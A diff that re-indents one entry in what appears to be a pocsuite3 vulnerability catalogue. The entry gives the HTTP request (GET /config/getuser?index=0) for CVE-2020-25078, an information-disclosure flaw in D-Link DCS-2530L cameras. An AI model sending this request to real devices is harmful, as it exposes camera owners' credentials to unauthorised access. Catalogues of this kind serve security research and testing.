@@ -20,10 +20,10 @@ pocsuite3
 
 ## D-Link
 - 🎯 cve-2020-25078(D-Link DCS-2530L 敏感信息泄露漏洞) ```2021-04-02```
-    ```
-    method: GET
-    path:   /config/getuser?index=0
-    ```
+      ```
+      method: GET
+      path:   /config/getuser?index=0
+      ```
 
 
 ## Eyou(亿邮)
